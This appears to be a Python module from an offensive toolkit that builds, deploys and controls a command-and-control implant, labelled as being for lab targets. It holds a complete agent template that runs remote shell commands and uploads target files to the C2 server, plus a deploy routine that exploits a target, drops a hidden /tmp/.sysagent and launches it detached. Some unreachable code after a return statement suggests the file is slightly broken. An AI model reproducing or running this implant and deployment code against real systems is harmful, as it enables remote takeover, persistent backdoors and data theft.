"""Malleable C2 client lifecycle for lab targets.

Builds a minimal stdlib-only polling agent (python2.5-era compatible:
urllib2 + openssl CLI, no third-party deps) that speaks the lazyc2
beacon protocol, manages a headless lazyc2 server process, and reads
per-client answers from ``sessions/<client_id>.records.jsonl``.

Protocol (lazyc2 classic, AES-256-CFB + base64 framing):
    poll    GET  {url}{route}{client_id}          -> enc("") when idle
    result  POST {url}{route}{client_id}          -> enc(result JSON)
    pull    GET  {url}/download/{file}            -> enc(file bytes)
    push    POST {url}/upload (multipart, "file") -> loot lands in uploads/

Agent special commands (issued like any other command):
    download:<path>  pull a C2-staged file down to the implant
    upload:<path>    push an implant file up to C2 (the loot primitive)

Security invariants:
    1. Lab and in-scope targets only; the manager binds loopback + lab
       HTTP listeners, never 0.0.0.0 without operator intent.
    2. No shell execution on import; execution happens only through
       explicit start()/deploy() calls with timeouts.
    3. All C2 API calls use operator basic-auth; the agent channel
       itself is AES-encrypted like every other beacon.
"""

from __future__ import annotations

import json
import logging
import os
import re
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

log = logging.getLogger("c2_agent")

_BASE_DIR = Path(__file__).resolve().parent.parent
_SESSIONS_DIR = _BASE_DIR / "sessions"
_PID_FILE = _SESSIONS_DIR / "c2_server.pid"
_C2_LOG = _SESSIONS_DIR / "c2_server.log"

_ID_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_-]{0,63}$")
_CREDENTIALS_FILE = _BASE_DIR / ".c2_credentials.txt"


def _sync_credentials_file(user: str, password: str) -> None:
    """Write the live server credentials to .c2_credentials.txt.

    This is the file lazyc2 itself writes on insecure boots and the
    file the shell's ``_sync_c2_credentials`` reads at startup — so it
    is the single human-visible source of truth for "which creds open
    the running C2". Same format lazyc2 uses, mode 0600. Only called
    for servers this manager started, never for foreign ones.
    """
    from datetime import UTC, datetime

    try:
        _CREDENTIALS_FILE.write_text(
            f"# LazyOwn C2 Credentials - Generated {datetime.now(UTC).isoformat()}\n"
            f"USERNAME={user}\n"
            f"PASSWORD={password}\n",
            encoding="utf-8",
        )
        os.chmod(_CREDENTIALS_FILE, 0o600)
    except OSError as exc:
        log.warning("Could not sync .c2_credentials.txt: %s", exc)
_HTTP_TIMEOUT = 20
_DEPLOY_TIMEOUT = 60


def _unverified_context() -> Any:
    """Return a no-verify TLS context (lab self-signed certs)."""
    import ssl as _ssl

    factory = getattr(_ssl, "create_unverified_context", None) or getattr(_ssl, "_create_unverified_context", None)
    if factory is None:
        raise RuntimeError("No unverified TLS context factory available")
    return factory()


def client_id_for(target: str) -> str:
    """Derive a stable, file-safe client id from a target IP."""
    slug = re.sub(r"[^A-Za-z0-9]+", "-", (target or "").strip()).strip("-") or "target"
    return f"msf-{slug.lower()}"[:64]


def validate_client_id(raw: str) -> str:
    """Validate a client id (alphanumerics, dash, underscore)."""
    candidate = (raw or "").strip()
    if not _ID_RE.match(candidate):
        raise ValueError(f"Invalid client id: {raw!r}")
    return candidate


AGENT_TEMPLATE = """#!/usr/bin/env python
# LazyOwn malleable lab agent (python2.5 stdlib + openssl CLI only).
# Polls {C2}{ROUTE}{ID}, executes, reports. Specials: download:<f>, upload:<f>.
import base64
import httplib
import os
import socket
import subprocess
import time
import urllib2

C2 = "{C2}"
ROUTE = "{ROUTE}"
ID = "{ID}"
KEY = "{KEY}"
SLEEP = {SLEEP}
TIMEOUT = 25
LOG = "/tmp/.agent.log"

# python2.5 has no per-call timeout kwarg: set a global default instead.
try:
    socket.setdefaulttimeout(TIMEOUT)
except Exception:
    pass


def _log(msg):
    try:
        open(LOG, "a").write(msg + "\\n")
    except Exception:
        pass


def _sh(cmd):
    try:
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        return p.communicate()[0]
    except Exception, e:
        return "agent exec error: " + str(e)


def _aes_decrypt_b64(blob):
    try:
        raw = base64.b64decode(blob)
    except Exception:
        return None
    if len(raw) < 16:
        return ""
    open("/tmp/.bct", "wb").write(raw[16:])
    iv = raw[:16].encode("hex")
    out = _sh("openssl enc -d -aes-256-cfb -K " + KEY + " -iv " + iv + " -in /tmp/.bct 2>/dev/null")
    try:
        os.unlink("/tmp/.bct")
    except Exception:
        pass
    return out


def _aes_encrypt_b64(plain):
    iv = os.urandom(16)
    open("/tmp/.bpt", "wb").write(plain)
    _sh("openssl enc -e -aes-256-cfb -K " + KEY + " -iv " + iv.encode("hex") + " -in /tmp/.bpt -out /tmp/.bct 2>/dev/null")
    try:
        ct = open("/tmp/.bct", "rb").read()
        os.unlink("/tmp/.bpt")
        os.unlink("/tmp/.bct")
    except Exception:
        return ""
    return base64.b64encode(iv + ct)


def _get(path):
    try:
        return urllib2.urlopen(C2 + path).read()
    except Exception, e:
        _log("GET failed: " + str(e))
        return None


def _post(path, body, ctype="application/octet-stream"):
    try:
        req = urllib2.Request(C2 + path, data=body, headers={"Content-Type": ctype})
        return urllib2.urlopen(req).read()
    except Exception, e:
        _log("POST failed: " + str(e))
        return None


def _js(s):
    if not isinstance(s, basestring):
        s = str(s)
    r = []
    for ch in s:
        o = ord(ch)
        if ch == "\\\\":
            r.append("\\\\\\\\")
        elif ch == '"':
            r.append('\\\\"')
        elif ch == "\\n":
            r.append("\\\\n")
        elif ch == "\\r":
            r.append("\\\\r")
        elif ch == "\\t":
            r.append("\\\\t")
        elif o < 32 or o > 126:
            r.append("\\\\u%04x" % o)
        else:
            r.append(ch)
    return '"' + "".join(r) + '"'


def _upload(path):
    try:
        data = open(path, "rb").read()
    except Exception, e:
        return "upload failed: cannot read " + path + ": " + str(e)
    boundary = "----LazyOwnBoundary"
    head = (
        "--" + boundary + "\\r\\n"
        + 'Content-Disposition: form-data; name="file"; filename="' + os.path.basename(path) + '"\\r\\n'
        + "Content-Type: application/octet-stream\\r\\n\\r\\n"
    )
    tail = "\\r\\n--" + boundary + "--\\r\\n"
    body = head + data + tail
    try:
        conn = httplib.HTTPConnection(HOST, PORT)
        conn.putrequest("POST", "/upload")
        conn.putheader("Content-Type", "multipart/form-data; boundary=" + boundary)
        conn.putheader("Content-Length", str(len(body)))
        conn.endheaders()
        conn.send(body)
        resp = conn.getresponse().read()
        conn.close()
        return "uploaded " + path + " (" + str(len(data)) + " bytes): " + resp[:120]
    except Exception, e:
        return "upload failed: " + str(e)


HOST = C2.split("//", 1)[1].split("/", 1)[0].split(":")[0]
try:
    PORT = int(C2.split("//", 1)[1].split("/", 1)[0].split(":")[1])
except Exception:
    PORT = 80


def _detach_fds():
    # Drop every inherited file descriptor (OPSEC + hygiene).
    # The agent is born inside a backdoor shell: without this it inherits
    # the backdoor LISTEN socket and wedges the target port forever even
    # after our session exits cleanly. Keep stdio only.
    # NOTE: the bulk-close helper only exists on python2.6+: close one by one.
    try:
        for _fd in range(3, 256):
            try:
                os.close(_fd)
            except Exception:
                pass
    except Exception:
        pass
    try:
        _dn = os.open("/dev/null", os.O_RDONLY)
        os.dup2(_dn, 0)
        if _dn != 0:
            os.close(_dn)
    except Exception:
        pass


_detach_fds()


def _hostinfo():
    try:
        hn = socket.gethostname()
    except Exception:
        hn = "unknown"
    try:
        ips = socket.gethostbyname_ex(hn)[2]
        ips = ", ".join(ips)
    except Exception:
        ips = ""
    try:
        user = _sh("id -un 2>/dev/null").strip()
    except Exception:
        user = ""
    return hn, ips, user


def _result(command, output):
    hn, ips, user = _hostinfo()
    try:
        pid = str(os.getpid())
    except Exception:
        pid = ""
    try:
        pwd = os.getcwd()
    except Exception:
        pwd = ""
    doc = (
        "{\\"output\\":" + _js(output)
        + ',\\"command\\":' + _js(command)
        + ',\\"client\\":' + _js(ID)
        + ',\\"pid\\":' + _js(pid)
        + ',\\"hostname\\":' + _js(hn)
        + ',\\"ips\\":' + _js(ips)
        + ',\\"user\\":' + _js(user)
        + ',\\"discovered_ips\\":\\"\\"'
        + ',\\"result_portscan\\":null'
        + ',\\"result_pwd\\":' + _js(pwd)
        + "}"
    )
    return _aes_encrypt_b64(doc)


def main():
    fails = 0
    while True:
        blob = _get(ROUTE + ID)
        if blob is None:
            fails = fails + 1
            time.sleep(min(SLEEP * (fails + 1), 120))
            continue
        cmd = _aes_decrypt_b64(blob.strip())
        if cmd is None or not cmd.strip():
            fails = fails + 1
            time.sleep(min(SLEEP * (fails + 1), 120))
            continue
        fails = 0
        cmd = cmd.strip()
        if cmd.startswith("download:"):
            src = cmd[len("download:"):].strip().lstrip("/")
            data = _get("/download/" + src)
            if data is None:
                out = "download failed: " + src
            else:
                plain = _aes_decrypt_b64(data.strip())
                if plain is None:
                    out = "download failed: decrypt error"
                else:
                    dst = "/tmp/" + os.path.basename(src)
                    open(dst, "wb").write(plain)
                    out = "saved " + src + " -> " + dst
        elif cmd.startswith("upload:"):
            out = _upload(cmd[len("upload:"):].strip())
        else:
            out = _sh(cmd)
        _post(ROUTE + ID, _result(cmd, out))
        time.sleep(SLEEP)


if __name__ == "__main__":
    main()
"""


def build_agent(c2_url: str, client_id: str, aes_hex: str, route: str = "", sleep: int = 10) -> str:
    """Render the agent script for a target (pure function, no I/O)."""
    key = (aes_hex or "").strip().lower()
    if not re.fullmatch(r"[0-9a-f]{64}", key):
        raise ValueError("AES key must be 64 hex chars (AES-256)")
    url = (c2_url or "").rstrip("/")
    if not re.match(r"^https?://", url):
        raise ValueError(f"C2 URL must be http(s): {c2_url!r}")
    route = route or "/"
    if not route.startswith("/"):
        route = "/" + route
    if not route.endswith("/"):
        route += "/"
    text = AGENT_TEMPLATE.replace("{C2}", url)
    text = text.replace("{ROUTE}", route)
    text = text.replace("{ID}", validate_client_id(client_id))
    text = text.replace("{KEY}", key)
    text = text.replace("{SLEEP}", str(max(2, min(int(sleep), 300))))
    return text


def _ensure_key() -> str:
    """Return the live C2 AES key hex — snapshotted, never generated.

    Ownership stays with the server (``sessions/key.aes`` while it
    runs). This snapshots the hex into ``sessions/c2_lab.json`` so agent
    builds survive shell sessions (whose at-rest crypto encrypts
    ``sessions/`` on exit). Silent generation is forbidden: a rotated
    key would brick every deployed agent with undecryptable commands.
    When nothing is available, fail loudly — start the C2 first.
    """
    key_path = _SESSIONS_DIR / "key.aes"
    lab_path = _SESSIONS_DIR / "c2_lab.json"
    try:
        raw = key_path.read_bytes()
        if len(raw) == 32:
            _snapshot_key(raw.hex())
            return raw.hex()
    except OSError:
        pass
    try:
        snapshot = json.loads(lab_path.read_text()).get("aes_hex", "") if lab_path.exists() else ""
        if re.fullmatch(r"[0-9a-f]{64}", snapshot or ""):
            return snapshot
    except (json.JSONDecodeError, OSError):
        pass
    raise RuntimeError(
        "No C2 AES key available (sessions/key.aes missing and no snapshot). "
        "Start the server first: c2_server start (it snapshots the key on boot)."
    )


def _restore_key_from_snapshot() -> bool:
    """Restore sessions/key.aes from the snapshot when missing.

    Called before server boot so the process deterministically loads
    the pinned key instead of generating a fresh one (which would brick
    every deployed agent). Never overwrites an existing file.
    """
    key_path = _SESSIONS_DIR / "key.aes"
    lab_path = _SESSIONS_DIR / "c2_lab.json"
    if key_path.exists():
        return False
    try:
        snapshot = json.loads(lab_path.read_text()).get("aes_hex", "") if lab_path.exists() else ""
        if re.fullmatch(r"[0-9a-f]{64}", snapshot or ""):
            key_path.write_bytes(bytes.fromhex(snapshot))
            os.chmod(key_path, 0o600)
            log.info("Restored C2 AES key from snapshot before boot.")
            return True
    except (json.JSONDecodeError, OSError, ValueError) as exc:
        log.warning("Key snapshot restore failed: %s", exc)
    return False


def _snapshot_key(aes_hex: str) -> None:
    """Persist the key hex into c2_lab.json without touching other fields."""
    lab_path = _SESSIONS_DIR / "c2_lab.json"
    try:
        data = json.loads(lab_path.read_text()) if lab_path.exists() else {}
    except (json.JSONDecodeError, OSError):
        data = {}
    if data.get("aes_hex") != aes_hex:
        data["aes_hex"] = aes_hex
        lab_path.write_text(json.dumps(data, indent=2), encoding="utf-8")


def read_aes_hex() -> str:
    """Read the live C2 AES key hex (snapshotted, never generated)."""
    return _ensure_key()


def deploy(
    target: str,
    c2_base: str,
    route: str = "",
    lhost: str = "127.0.0.1",
    sleep: int = 10,
) -> dict[str, Any]:
    """Deliver + launch the agent on *target* via a working shell primitive.

    Uses the highest-ranked exec-capable exploit to drop the rendered
    agent at /tmp/.sysagent, chmod +x, and launch it detached. Returns
    the client id and a callback-wait summary.
    """
    from atomic_exploit_bridge import open_shell, remote_exec

    client_id = client_id_for(target)
    aes_hex = _ensure_key()
    agent = build_agent(c2_base, client_id, aes_hex, route=route, sleep=sleep)
    staged = _SESSIONS_DIR / "temp_uploads" / f"agent_{client_id}.py"
    staged.parent.mkdir(parents=True, exist_ok=True)
    staged.write_text(agent, encoding="utf-8")
    queue_file = _SESSIONS_DIR / f"cmd_{client_id}.json"
    try:
        if queue_file.exists():
            queue_file.write_text("[]", encoding="utf-8")
    except OSError:
        pass
    spec = open_shell(target, lhost=lhost)
    if spec is None:
        return {"deployed": False, "reason": "no working shell primitive", "client_id": client_id}
    import base64 as _b64

    from atomic_exploit_bridge import close_sessions as _close_shells

    blob = _b64.b64encode(agent.encode()).decode()
    chunk = 4000
    parts = [blob[i : i + chunk] for i in range(0, len(blob), chunk)]
    try:
        remote_exec(spec, target, f"printf '%s' '{parts[0]}' > /tmp/.sysagent.b64", lhost=lhost)
        for part in parts[1:]:
            remote_exec(spec, target, f"printf '%s' '{part}' >> /tmp/.sysagent.b64", lhost=lhost)
        verify = remote_exec(
            spec,
            target,
            "base64 -d /tmp/.sysagent.b64 > /tmp/.sysagent && rm -f /tmp/.sysagent.b64"
            " && wc -c < /tmp/.sysagent && head -1 /tmp/.sysagent",
            lhost=lhost,
        )
        size_ok = str(len(agent.encode())) in (verify or "")
        launched = remote_exec(spec, target, "chmod +x /tmp/.sysagent && (nohup python /tmp/.sysagent </dev/null >/dev/null 2>&1 &) && sleep 2 && ps aux | grep -c '[.]sysagent'", lhost=lhost)
        running = (launched or "").strip().split()[-1] if (launched or "").strip() else "0"
    finally:
        _close_shells(target)
    return {
        "deployed": True,
        "client_id": client_id,
        "via": spec.id,
        "staged": str(staged),
        "size_ok": size_ok,
        "verify_output": (verify or "")[:200],
        "agent_running": running not in ("0", "[error]"),
        "launch_output": (launched or "")[:300],
    }

    sys.path.insert(0, str(_BASE_DIR))
    from lazyc2.security.services import AESKeyManager

    manager = AESKeyManager(_SESSIONS_DIR / "key.aes")
    return manager.get_or_generate().hex()


def read_records(client_id: str, limit: int = 20) -> list[dict[str, Any]]:
    """Read the latest beacon records for a client (newest last)."""
    safe = "".join(c for c in client_id if c.isalnum() or c in "-_")
    path = _SESSIONS_DIR / f"{safe}.records.jsonl"
    if not path.exists():
        return []
    rows: list[dict[str, Any]] = []
    try:
        for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
            line = line.strip()
            if line:
                rows.append(json.loads(line))
    except Exception as exc:
        log.warning("records read failed: %s", exc)
    return rows[-limit:]


def wait_record(client_id: str, command: str, since: int = 0, timeout: int = 60) -> dict[str, Any] | None:
    """Wait for a fresh record matching *command* (polls the JSONL log)."""
    deadline = time.time() + max(5, timeout)
    while time.time() < deadline:
        for row in read_records(client_id, limit=30):
            if row.get("command", "") == command:
                ts = row.get("timestamp", "")
                if since and isinstance(ts, str) and ts <= since:
                    continue
                return row
        time.sleep(3)
    return None


class C2Server:
    """Headless lazyc2 lifecycle (start in background, status, stop)."""

    def __init__(self, port: int = 4444, user: str = "", password: str = "") -> None:
        self.port = int(port)
        self.user = user
        self.password = password

    def _pid(self) -> int | None:
        """Return the recorded server pid when still alive."""
        try:
            pid = int(_PID_FILE.read_text().strip())
        except (OSError, ValueError):
            return None
        try:
            os.kill(pid, 0)
            return pid
        except OSError:
            return None

    def status(self) -> dict[str, Any]:
        """Report server liveness and listener reachability."""
        pid = self._pid()
        info: dict[str, Any] = {"running": pid is not None, "pid": pid, "port": self.port}
        if pid is not None:
            import urllib.request

            hosts = ["127.0.0.1"]
            try:
                payload = json.loads((_BASE_DIR / "payload.json").read_text())
                lhost = str(payload.get("lhost", "") or "")
                if lhost and lhost not in hosts:
                    hosts.append(lhost)
            except Exception:
                pass
            for scheme in ("https", "http"):
                up = False
                for host in hosts:
                    try:
                        req = urllib.request.Request(f"{scheme}://{host}:{self.port}/login")
                        kwargs: dict[str, Any] = {"timeout": 5}
                        if scheme == "https":
                            kwargs["context"] = _unverified_context()
                        with urllib.request.urlopen(req, **kwargs) as resp:
                            up = resp.status == 200
                    except Exception:
                        continue
                    if up:
                        break
                info[f"{scheme}_up"] = up
        return info

    def start(self) -> dict[str, Any]:
        """Start lazyc2 headless (no-op when already running)."""
        if self._pid() is not None:
            return {"started": False, "reason": "already running", **self.status()}
        _restore_key_from_snapshot()
        _SESSIONS_DIR.mkdir(parents=True, exist_ok=True)
        log_file = _C2_LOG.open("ab")
        proc = subprocess.Popen(
            [sys.executable, "lazyc2.py", str(self.port), self.user, self.password],
            cwd=str(_BASE_DIR),
            stdout=log_file,
            stderr=subprocess.STDOUT,
            start_new_session=True,
        )
        _PID_FILE.write_text(str(proc.pid), encoding="utf-8")
        deadline = time.time() + 180
        while time.time() < deadline:
            code = proc.poll()
            if code is not None:
                return {"started": False,
                        "reason": f"process exited code={code}, see sessions/c2_server.log"}
            if self.status().get("https_up") or self.status().get("http_up"):
                try:
                    _ensure_key()
                except RuntimeError as exc:
                    return {"started": False, "reason": f"listener up but key snapshot failed: {exc}"}
                _sync_credentials_file(self.user, self.password)
                return {"started": True, **self.status()}
            time.sleep(2)
        return {"started": False, "reason": "timeout waiting for listener"}

    def stop(self) -> dict[str, Any]:
        """Stop the headless server (SIGTERM, best-effort)."""
        import signal as _signal

        pid = self._pid()
        if pid is None:
            return {"stopped": False, "reason": "not running"}
        try:
            os.kill(pid, _signal.SIGTERM)
        except OSError as exc:
            return {"stopped": False, "reason": str(exc)}
        for _ in range(10):
            try:
                os.kill(pid, 0)
            except OSError:
                break
            time.sleep(1)
        try:
            _PID_FILE.unlink()
        except OSError:
            pass
        return {"stopped": True}

    def ensure_http_listener(self, http_port: int, auth: tuple[str, str]) -> dict[str, Any]:
        """Add + start a plaintext lab listener via the C2 API (py2 agents lack TLS).

        Idempotent: returns the existing listener when the port is taken.
        """
        import base64 as _b64
        import urllib.request

        def _api(path: str, data: bytes | None = None) -> tuple[int, str]:
            token = _b64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
            hosts = ["127.0.0.1"]
            try:
                lhost = str(json.loads((_BASE_DIR / "payload.json").read_text()).get("lhost", "") or "")
                if lhost and lhost not in hosts:
                    hosts.append(lhost)
            except Exception:
                pass
            last: tuple[int, str] = (0, "unreachable")
            for host in hosts:
                req = urllib.request.Request(
                    f"https://{host}:{self.port}{path}",
                    data=data,
                    headers={"Content-Type": "application/json", "Authorization": f"Basic {token}"},
                )
                try:
                    with urllib.request.urlopen(req, timeout=10, context=_unverified_context()) as resp:
                        return resp.status, resp.read().decode()[:500]
                except Exception as exc:
                    last = (0, str(exc)[:200])
            return last

        status, body = _api("/api/listeners")
        if status == 200:
            try:
                for entry in json.loads(body).get("listeners", []):
                    if int(entry.get("port", 0)) == int(http_port):
                        return {"ok": True, "listener": entry, "note": "already present"}
            except (json.JSONDecodeError, ValueError, KeyError, TypeError):
                pass
        payload = json.dumps({"port": int(http_port), "ssl": False, "start": True}).encode()
        status, body = _api("/api/listeners", payload)
        return {"ok": status == 200, "body": body[:300]}
